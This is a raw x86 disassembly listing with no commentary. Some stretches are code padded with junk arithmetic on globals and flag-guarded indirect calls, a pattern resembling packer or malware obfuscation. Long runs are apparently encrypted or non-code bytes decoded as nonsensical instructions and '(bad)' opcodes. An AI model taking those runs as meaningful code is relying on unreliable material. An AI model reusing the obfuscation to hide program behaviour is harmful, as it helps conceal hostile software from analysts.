  417be0:	jp     0x417c5b
  417be2:	data16 or al,0x74
  417be5:	das    
  417be6:	in     eax,dx
  417be7:	dec    eax
  417be8:	mov    dh,0x74
  417bea:	scas   eax,DWORD PTR es:[edi]
  417beb:	in     eax,0xf9
  417bed:	fiadd  DWORD PTR [esi-0x79]
  417bf0:	std    
  417bf1:	das    
  417bf2:	cmc    
  417bf3:	cli    
  417bf4:	jne    0x417c43
  417bf6:	in     eax,dx
  417bf7:	push   es
  417bf8:	and    BYTE PTR [esi-0x4f132289],bl
  417bfe:	lds    eax,FWORD PTR [esp+eax*4-0x3b]
  417c02:	(bad)  
  417c03:	mov    dh,0x5e
  417c05:	(bad)  [edi]
  417c07:	nop
  417c08:	cdq    
  417c09:	out    0x5f,eax
  417c0b:	(bad)  
  417c0c:	push   edi
  417c0d:	or     eax,DWORD PTR [edx+edx*1-0x37a948b5]
  417c14:	jmp    0x417bd9
  417c16:	scas   al,BYTE PTR es:[edi]
  417c17:	push   eax
  417c18:	adc    eax,DWORD PTR [esi]
  417c1a:	ds scas al,BYTE PTR es:[edi]
  417c1c:	loopne 0x417c8c
  417c1e:	out    0x77,al
  417c20:	sub    esp,DWORD PTR gs:[ebx+0x7e]
  417c24:	cmp    al,0x28
  417c26:	push   ebp
  417c27:	scas   eax,DWORD PTR es:[edi]
  417c28:	mov    al,ds:0x610740b1
  417c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c2e:	push   es
  417c2f:	inc    ebx
  417c30:	push   ss
  417c31:	sub    eax,0x30574838
  417c36:	call   0x3063a727
  417c3b:	jmp    0x417c97
  417c3d:	add    eax,0x263c52a4
  417c42:	pop    ebp
  417c43:	aam    0x2b
  417c45:	add    eax,0xe084317d
  417c4a:	mov    esp,ebx
  417c4c:	xor    eax,0x66b6117a
  417c51:	mov    edi,0x2cd1a658
  417c56:	xchg   edx,eax
  417c57:	sbb    BYTE PTR [ebp+0x7b],ch
  417c5a:	push   eax
  417c5b:	xchg   edx,eax
  417c5c:	inc    eax
  417c5d:	mov    WORD PTR [edi-0x48],?
  417c60:	inc    edx
  417c61:	mov    DWORD PTR [esp+0x1c],esi
  417c65:	add    DWORD PTR ds:0x428455,0x4dd4
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42859d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x42845d,0x42849d
  417c89:	push   0x4
  417c8b:	push   0x4225ac
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x42846d,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x4284fd,0x0
  417cb2:	mov    DWORD PTR ds:0x428591,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x42846d,0x3679
  417cd7:	cmp    DWORD PTR ds:0x4284fd,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x428515
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x42856d
  417d00:	and    DWORD PTR ds:0x42837d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x42835d
  417d10:	and    DWORD PTR ds:0x42834d,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x428441
  417d1e:	mov    edx,DWORD PTR ds:0x4284b5
  417d24:	mov    ebx,DWORD PTR ds:0x428531
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x428355,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x4284ed,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428379,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x42846d,edi
  417d61:	cmp    DWORD PTR ds:0x428355,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428371
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428485,ecx
  417d87:	mov    DWORD PTR ds:0x428511,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428589
  417d97:	adc    DWORD PTR ds:0x428519,0x890
  417da1:	xor    DWORD PTR ds:0x428385,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x42834d
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417d6c
  417ddf:	in     al,dx
  417de0:	leave  
  417de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de2:	jmp    0x417dca
  417de4:	sar    BYTE PTR [esi-0x41413dcb],0xd8
  417deb:	inc    edx
  417dec:	stc    
  417ded:	xchg   ebx,eax
  417dee:	add    ecx,DWORD PTR [edi]
  417df0:	addr16 int 0x58
  417df3:	repnz fdiv st(7),st
  417df6:	(bad)  
  417df7:	dec    edi
  417df8:	in     al,dx
  417df9:	mov    dl,0x81
  417dfb:	fcom   st(1)
  417dfd:	mov    eax,ds:0x7fc89feb
  417e02:	xor    BYTE PTR [ebp+edi*8+0x6cfc64f3],bl
  417e09:	ret    
  417e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e0b:	pop    esi
  417e0c:	imul   ecx,DWORD PTR [ebx+0x20802f6b],0x10529a94
  417e16:	cwde   
  417e17:	bound  ecx,QWORD PTR [esp+ebp*2]
  417e1a:	inc    esi
  417e1b:	cmp    DWORD PTR [ebx],0x5a
  417e1e:	xchg   edi,eax
  417e1f:	dec    edi
  417e20:	int    0x95
  417e22:	push   es
  417e23:	fcomp  DWORD PTR [ecx+0x7c]
  417e26:	push   esi
  417e27:	pusha  
  417e28:	xor    eax,0x5a30d0db
  417e2d:	add    BYTE PTR [edx],0x0
  417e30:	out    dx,eax
  417e31:	fisttp WORD PTR [esi+eax*4-0x7e5ae8fa]
  417e38:	jl     0x417e2e
  417e3a:	mov    esp,edx
  417e3c:	fs int3 
  417e3e:	or     eax,0xf854350c
  417e43:	cli    
  417e44:	mov    esp,0xb48fe548
  417e49:	jl     0x417e9c
  417e4b:	mov    esi,0xc3b22036
  417e50:	mov    ch,0xf5
  417e52:	xor    eax,0xc72561f2
  417e57:	aad    0xc1
  417e59:	sbb    ch,BYTE PTR [ebx]
  417e5b:	xchg   esp,eax
  417e5c:	jno    0x417e46
  417e5e:	aam    0xb5
  417e60:	sbb    BYTE PTR [ecx-0x24],cl
  417e63:	lea    esp,fs:[ebx-0x43804deb]
  417e6a:	mov    edi,0xd2fd6295
  417e6f:	add    eax,0x3d1525e6
  417e74:	and    ecx,DWORD PTR ds:0x4ba209e7
  417e7a:	push   esp
  417e7b:	jp     0x417e25
  417e7d:	mov    WORD PTR [edi],cs
  417e7f:	lea    edi,[ebx]
  417e81:	pop    ds
  417e82:	cdq    
  417e83:	adc    DWORD PTR [eax+ebx*2-0x4b],edx
  417e87:	js     0x417ef5
  417e89:	int    0x96
  417e8b:	mov    ds:0xb7c192df,al
  417e90:	xor    al,BYTE PTR [edx]
  417e92:	pop    ds
  417e93:	or     al,0x3a
  417e95:	mov    eax,0x164f621f
  417e9a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417e9c:	cmp    DWORD PTR [edx-0x7918433b],ecx
  417ea2:	mov    dl,0xf9
  417ea4:	(bad)  
  417ea6:	push   ecx
  417ea7:	inc    ebp
  417ea8:	jl     0x417ede
  417eaa:	inc    esp
  417eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eac:	adc    al,dh
  417eae:	push   edi
  417eaf:	inc    eax
  417eb0:	enter  0xc87d,0xa1
  417eb4:	es ds repnz cmp eax,0x4ddddea4
  417ebc:	xchg   ebp,eax
  417ebd:	xor    eax,DWORD PTR [esi+0x60048dfe]
  417ec3:	cmp    dh,BYTE PTR [edi+0x64]
  417ec6:	xor    ebp,esi
  417ec8:	cs sbb cl,cl
  417ecb:	rcl    cl,0x65
  417ece:	or     edx,eax
  417ed0:	iret   
  417ed1:	mov    WORD PTR [edx],es
  417ed3:	fs fs push ds
  417ed6:	pop    edx
  417ed7:	push   ds
  417ed8:	and    BYTE PTR [ebp-0x11bdb879],dh
  417ede:	xchg   edx,eax
  417edf:	push   0xbc2602ea
  417ee4:	out    0x62,eax
  417ee6:	jl     0x417f18
  417ee8:	scas   eax,DWORD PTR es:[edi]
  417ee9:	int    0xa3
  417eeb:	mov    bl,0x4b
  417eed:	jo     0x417ee3
  417eef:	jle    0x417eb6
  417ef1:	pushf  
  417ef2:	cmp    esi,DWORD PTR [ecx-0x19]
  417ef5:	leave  
  417ef6:	mov    ecx,0x177596e8
  417efb:	jge    0x417f29
  417efd:	loop   0x417f3d
  417eff:	sbb    eax,0xdb6a4968
  417f04:	adc    edx,DWORD PTR [esp+eax*8+0x49]
  417f08:	outs   dx,DWORD PTR ds:[esi]
  417f09:	aam    0x9f
  417f0b:	add    ebp,DWORD PTR [ebp+0x7b]
  417f0e:	adc    eax,0x65eb8bfa
  417f13:	int3   
  417f14:	scas   al,BYTE PTR es:[edi]
  417f15:	cmp    DWORD PTR [edi+ecx*4+0x3085211c],esi
  417f1c:	lahf   
  417f1d:	dec    esi
  417f1e:	fmul   DWORD PTR [edx+0x39]
  417f21:	mov    ebp,DWORD PTR [esi+0x5e]
  417f24:	or     DWORD PTR [esi],0xe5a9acc8
  417f2a:	les    ebp,FWORD PTR [edi-0xa]
  417f2d:	repz in al,dx
  417f2f:	xor    al,0x6
  417f31:	call   0x2cf2:0x4f269a9
  417f38:	adc    DWORD PTR [eax],0x5b87803f
  417f3e:	lea    ebp,[bx+si-0x3c]
  417f42:	inc    esp
  417f43:	lods   al,BYTE PTR ds:[esi]
  417f44:	cld    
  417f45:	inc    edi
  417f46:	jne    0x417f01
  417f48:	pop    edi
  417f49:	xor    BYTE PTR [esp+ebx*8],al
  417f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4d:	push   0xffffffed
  417f4f:	xchg   ebx,eax
  417f50:	adc    cl,0x9b
  417f53:	sar    al,cl
  417f55:	imul   eax,esp,0xffffffc3
  417f58:	jnp    0x417ee4
  417f5a:	sahf   
  417f5b:	xor    DWORD PTR [esi+eax*8],eax
  417f5e:	mov    dh,0x4d
  417f60:	js     0x417f64
  417f62:	sbb    eax,0x4e2a22c9
  417f67:	cwde   
  417f68:	jmp    DWORD PTR [ebp-0x6a]
  417f6b:	bound  edi,QWORD PTR [edx]
  417f6d:	scas   al,BYTE PTR es:[edi]
  417f6e:	xchg   dh,al
  417f70:	cli    
  417f71:	in     eax,0xc6
  417f73:	in     al,0xc4
  417f75:	adc    cl,BYTE PTR [edx+0x75]
  417f78:	std    
  417f79:	fild   QWORD PTR [edx-0xd042b4e]
  417f7f:	repz xor ebx,DWORD PTR [edx+eiz*1-0x65879ded]
  417f87:	int    0x76
  417f89:	out    dx,eax
  417f8a:	mov    eax,ds:0x5f94694c
  417f8f:	sbb    edi,DWORD PTR [ecx]
  417f91:	jno    0x417fa6
  417f93:	dec    esi
  417f94:	out    0xc9,al
  417f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f97:	in     eax,dx
  417f98:	cmp    bl,BYTE PTR [esi+0x3f53eb20]
  417f9e:	scas   al,BYTE PTR es:[edi]
  417f9f:	ror    DWORD PTR [edx],1
  417fa1:	leave  
  417fa2:	js     0x417f41
  417fa4:	mov    BYTE PTR [esp+ebp*2+0x68],dh
  417fa8:	in     al,dx
  417fa9:	loop   0x417fe7
  417fab:	and    eax,0xd7ef093b
  417fb0:	add    esi,DWORD PTR [edi]
  417fb2:	aam    0xe8
  417fb4:	mov    esi,0x24a7ba6c
  417fb9:	mov    eax,ds:0x1b2a6d4f
  417fbe:	or     ah,BYTE PTR [ecx]
  417fc0:	or     DWORD PTR [esi+eiz*1-0x17ecca25],esi
  417fc7:	(bad)  
  417fc8:	and    ebp,eax
  417fca:	out    0xb3,al
  417fcc:	push   cs
  417fcd:	popf   
  417fce:	adc    eax,0xd9369d87
  417fd3:	sub    al,0xdf
  417fd5:	mov    esi,0x14646bf0
  417fda:	mov    ecx,0xc07e920c
  417fdf:	aad    0x27
  417fe1:	xchg   esp,eax
  417fe2:	pop    edi
  417fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fe4:	adc    DWORD PTR [eax],esp
  417fe6:	and    DWORD PTR ds:0xda8eea80,esi
  417fec:	adc    al,0xbb
  417fee:	rcr    esp,cl
  417ff0:	int3   
  417ff1:	push   esp
  417ff2:	and    dh,BYTE PTR [ecx+0x1d9bd07b]
  417ff8:	inc    ecx
  417ff9:	xchg   ebp,eax
  417ffa:	cld    
  417ffb:	mov    dh,0xca
  417ffd:	inc    ebp
  417ffe:	cld    
  417fff:	and    edx,ecx
  418001:	fldcw  WORD PTR [ebx-0x4e140642]
  418007:	sar    DWORD PTR [edi-0x5ed0a4d6],0x44
  41800e:	imul   esp,DWORD PTR [edx],0xaa6227da
  418014:	test   DWORD PTR [eax-0x59],0xa6ea6aa1
  41801b:	inc    ecx
  41801c:	sbb    esi,ecx
  41801e:	pop    ebp
  41801f:	sub    eax,0x263f641a
  418024:	pop    edx
  418025:	fnstenv [eax]
  418027:	mov    bh,0x94
  418029:	jl     0x417fb8
  41802b:	test   BYTE PTR [eax+ebx*4],ah
  41802e:	add    BYTE PTR [eax],al
  418030:	add    BYTE PTR [ebx+0x42847d3d],al
  418036:	add    BYTE PTR [eax],al
  418038:	mov    DWORD PTR ds:0x428355,0x1551
  418042:	mov    DWORD PTR ds:0x428565,0x780e
  41804c:	mov    DWORD PTR ds:0x428359,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x428361,edx
  418061:	mov    DWORD PTR ds:0x42835d,0x4140
  41806b:	cmp    DWORD PTR ds:0x42847d,0x0
  418072:	je     0x4180ae
  418078:	push   0x428211
  41807d:	push   0x428177
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x4284b5
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x42855d
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x428425
  4180a1:	adc    DWORD PTR ds:0x428521,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x42846d,edi
  4180ae:	adc    DWORD PTR ds:0x4284f9,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x4283d1
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x428445,ebx
  4180c4:	xor    DWORD PTR ds:0x428509,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428485,0x0
  4180d5:	mov    DWORD PTR ds:0x42846d,edx
  4180db:	mov    edx,DWORD PTR ds:0x4284fd
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42859d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428485,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x428431
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428389,ecx
  41810f:	adc    DWORD PTR ds:0x428569,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428495
  418121:	mov    edx,DWORD PTR ds:0x4283a9
  418127:	mov    ebx,DWORD PTR ds:0x428531
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x428569
  418138:	mov    ebx,DWORD PTR ds:0x4283d9
  41813e:	mov    ecx,DWORD PTR ds:0x4285d9
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428471,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42859d
  418164:	sub    DWORD PTR ds:0x42847d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428595,0x0
  418174:	mov    DWORD PTR ds:0x4284fd,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428595,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428495,ebx
  4181b3:	add    DWORD PTR ds:0x428599,0x428461
  4181bd:	mov    ebx,DWORD PTR ds:0x428581
  4181c3:	sbb    ebx,DWORD PTR ds:0x428429
  4181c9:	mov    DWORD PTR ds:0x428581,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x4283cd
  4181d5:	mov    ebx,DWORD PTR ds:0x428549
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x42834d
  4181e6:	and    ebx,DWORD PTR ds:0x428449
  4181ec:	mov    DWORD PTR ds:0x42834d,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42857d,0x0
  418207:	mov    DWORD PTR ds:0x428505,0x564a
  418211:	mov    DWORD PTR ds:0x428485,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42857d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428479
  418252:	adc    DWORD PTR ds:0x42858d,ecx
  418258:	xor    DWORD PTR ds:0x428365,0x4309
  418262:	sub    DWORD PTR ds:0x428395,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	in     al,0x65
  41827f:	pop    edx
  418280:	shl    DWORD PTR [edx+ebp*8-0x40],1
  418284:	mov    esi,0xbebec235
  418289:	jle    0x4182e7
  41828b:	cmp    ebx,ecx
  41828d:	shl    DWORD PTR [ebx],1
  41828f:	mov    bl,0x71
  418291:	jmp    0x7b2e:0x1ec29081
  418298:	cdq    
  418299:	ret    0x44f9
  41829c:	gs mov esp,0x5c38c1d4
  4182a2:	lahf   
  4182a3:	mov    edx,0xbc9de317
  4182a8:	pop    edi
  4182a9:	cmp    ebp,DWORD PTR [ebp-0x69]
  4182ac:	inc    ebp
  4182ad:	daa    
  4182ae:	or     eax,0xbb89a179
  4182b3:	jecxz  0x418242
  4182b5:	ja     0x41830a
  4182b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182b8:	jne    0x41831b
  4182ba:	or     al,0x7d
  4182bc:	in     eax,0xb2
  4182be:	cwde   
  4182bf:	adc    BYTE PTR [ebx],al
  4182c1:	and    dh,BYTE PTR [ecx+0x1418b578]
  4182c7:	ins    BYTE PTR es:[edi],dx
  4182c8:	nop
  4182c9:	adc    dl,BYTE PTR [esi]
  4182cb:	adc    BYTE PTR [esi+0x681d1256],dh
  4182d1:	mov    ds:0x89537aac,al
  4182d6:	cmp    esp,DWORD PTR [esi-0x4b]
  4182d9:	xlat   BYTE PTR ds:[ebx]
  4182da:	xor    ch,BYTE PTR [ecx+0x19e2ca55]
  4182e0:	and    bl,BYTE PTR [edi]
  4182e2:	adc    al,dh
  4182e4:	fisub  DWORD PTR [edi-0x75f916d4]
  4182ea:	xchg   DWORD PTR [eax+0x56e13db4],esp
  4182f0:	cwde   
  4182f1:	adc    al,0xfc
  4182f3:	or     ch,dl
  4182f5:	adc    dh,BYTE PTR [ebx-0x35887b55]
  4182fb:	cld    
  4182fc:	arpl   WORD PTR ds:0xc6d20fb,bx
  418302:	int    0xe
  418304:	jnp    0x4182e6
  418306:	int    0x3f
  418308:	add    esi,ebp
  41830a:	add    al,0x96
  41830c:	ja     0x41830c
  41830e:	ja     0x418300
  418310:	mov    ebx,0x4df8df4
  418315:	fmul   DWORD PTR [esp+ebp*1-0x41]
  418319:	push   0x300f50cb
  41831e:	dec    eax
  41831f:	or     al,BYTE PTR [edx+0x4ab75488]
  418325:	sbb    BYTE PTR [ecx],bl
  418327:	jecxz  0x418314
  418329:	jmp    0x702c:0x8af137e7
  418330:	jbe    0x4182c6
  418332:	dec    ebp
  418333:	add    BYTE PTR ds:0xd38acc2b,ah
  418339:	stos   BYTE PTR es:[edi],al
  41833a:	add    BYTE PTR [ecx+ecx*8+0x5e015fde],bh
  418341:	inc    edi
  418342:	dec    eax
  418343:	leave  
  418344:	mov    ah,0x76
  418346:	sub    ebp,DWORD PTR [ecx]
  418348:	dec    ecx
  418349:	fldcw  WORD PTR [esi+0x7f8f4c37]
  41834f:	adc    ah,BYTE PTR [eax-0x14]
  418352:	fwait
  418353:	and    edx,edi
  418355:	in     eax,dx
  418356:	add    al,0xf6
  418358:	push   ebp
  418359:	dec    edx
  41835a:	mov    ebp,0xfa7a53f1
  41835f:	mov    dl,0x14
  418361:	mov    eax,ds:0xa18ecd32
  418366:	pop    esp
  418367:	cmp    esi,DWORD PTR gs:[eax-0x5b]
  41836b:	clc    
  41836c:	cld    
  41836d:	(bad)  
  41836e:	(bad)  
  418370:	add    DWORD PTR [edx+0x2a8626a9],edx
  418376:	in     al,dx
  418377:	inc    esi
  418378:	retf   
  418379:	push   0x34
  41837b:	das    
  41837c:	dec    edi
  41837d:	les    ebx,FWORD PTR [ecx]
  41837f:	sub    dh,cl
  418381:	xor    al,0x67
  418383:	and    esi,DWORD PTR [ebx-0x42d15a6b]
  418389:	ins    BYTE PTR es:[edi],dx
  41838a:	ficom  WORD PTR [eax+0x3323a9c]
  418390:	push   esi
  418391:	xor    BYTE PTR [edi-0x2],0xce
  418395:	jnp    0x4183fc
  418397:	sbb    al,0x56
  418399:	mov    edx,0x88898275
  41839e:	push   ebx
  41839f:	push   cs
  4183a0:	cli    
  4183a1:	dec    esp
  4183a2:	sbb    BYTE PTR ds:0x35453866,ah
  4183a8:	jg     0x418374
  4183aa:	sbb    DWORD PTR [edi-0x11fcb54a],esi
  4183b0:	sti    
  4183b1:	sub    BYTE PTR [edi*2-0x2761627e],0x84
  4183b9:	jo     0x41840f
  4183bb:	inc    esi
  4183bc:	cmp    edi,eax
  4183be:	cmp    eax,0xa81d91a1
  4183c3:	enter  0x1b47,0xeb
  4183c7:	sub    DWORD PTR [edi+0x66341c42],ebp
  4183cd:	jns    0x418371
  4183cf:	into   
  4183d0:	add    eax,0xea5dae86
  4183d5:	stos   BYTE PTR es:[edi],al
  4183d6:	mov    esi,0xa99c42e3
  4183db:	sbb    al,0x7b
  4183dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183de:	adc    BYTE PTR [edi+ebx*1+0x1e],dh
  4183e2:	mov    bl,0xa0
  4183e4:	cmp    eax,0xd8173fe9
  4183e9:	mov    ah,0x8d
  4183eb:	xchg   edi,eax
  4183ec:	shl    DWORD PTR [edx+ecx*8+0x5f],0x2c
  4183f1:	push   ecx
  4183f2:	adc    edi,DWORD PTR [edi-0x11cf8d02]
  4183f8:	dec    edi
  4183f9:	jl     0x418410
  4183fb:	das    
  4183fc:	ficomp DWORD PTR [edi-0x3000537]
  418402:	dec    esp
  418403:	icebp  
  418404:	test   al,ah
  418406:	call   0xe07f:0x426d6c5e
  41840d:	dec    ebp
  41840e:	push   ds
  41840f:	and    al,0xcb
  418411:	push   esi
  418412:	adc    eax,DWORD PTR [ebx-0x5d]
  418415:	cld    
  418416:	mov    dl,0xbd
  418418:	jno    0x41841e
  41841a:	inc    edx
  41841b:	sub    dh,dh
  41841d:	jp     0x418426
  41841f:	stos   BYTE PTR es:[edi],al
  418420:	xchg   esi,eax
  418421:	data16 test ch,dh
  418424:	push   0x47d4b3a5
  418429:	inc    edi
  41842a:	clc    
  41842b:	inc    eax
  41842c:	sbb    al,0xa2
  41842e:	in     eax,0x3d
  418430:	fisubr WORD PTR [ebx+0x12dfa882]
  418436:	and    ah,BYTE PTR [esi+eiz*2]
  418439:	in     eax,0x42
  41843b:	std    
  41843c:	sub    ebp,DWORD PTR [ebx-0x4c747279]
  418442:	adc    BYTE PTR [esi+0x69],bl
  418445:	xchg   BYTE PTR [esp+ebp*1-0x29],dl
  418449:	repz dec ebp
  41844b:	(bad)  
  41844c:	jmp    0x7b15:0xcca64fb7
  418453:	stos   BYTE PTR es:[edi],al
  418454:	add    al,0x6e
  418456:	jmp    0x982d:0xa0ae42ba
  41845d:	shr    ebx,1
  41845f:	push   0x8
  418461:	retf   
  418462:	pusha  
  418463:	rcl    eax,0xa2
  418466:	mov    bh,dl
  418468:	xor    bh,dl
  41846a:	pop    edi
  41846b:	push   ebx
  41846c:	push   ss
  41846d:	xor    al,0x36
  41846f:	lahf   
  418470:	xor    edx,esi
  418472:	xchg   edx,eax
  418473:	imul   esi,DWORD PTR [esi+eax*1-0x35],0xffffffa8
  418478:	xchg   esi,eax
  418479:	in     eax,dx
  41847a:	cmp    eax,0xd13df44a
  41847f:	hlt    
  418480:	cwde   
  418481:	scas   eax,DWORD PTR es:[edi]
  418482:	ss enter 0xfae8,0xb8
  418487:	and    eax,0x15684430
  41848c:	sbb    eax,0x418546d
  418491:	cmp    BYTE PTR [ecx-0x41b66a85],bl
  418497:	mov    ds:0x2879674d,al
  41849c:	xor    eax,0xdd2ae9b2
  4184a1:	mov    esp,0x995ebdd
  4184a6:	xlat   BYTE PTR ds:[ebx]
  4184a7:	and    DWORD PTR [ecx-0x30],0xfffffff1
  4184ab:	jg     0x41843d
  4184ad:	rcr    esp,cl
  4184af:	xchg   edx,esi
  4184b1:	outs   dx,BYTE PTR ds:[esi]
  4184b2:	and    DWORD PTR [ecx+0x65fce335],eax
  4184b8:	push   edi
  4184b9:	div    ch
  4184bb:	push   ss
  4184bc:	rcl    BYTE PTR [ecx-0x2fbcb7ba],1
  4184c2:	out    dx,al
  4184c3:	inc    edx
  4184c4:	outs   dx,BYTE PTR ds:[esi]
  4184c5:	pop    ds
  4184c6:	sub    dh,BYTE PTR [edx+0x48]
  4184c9:	mov    DWORD PTR [esp+0x34],0x4445
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
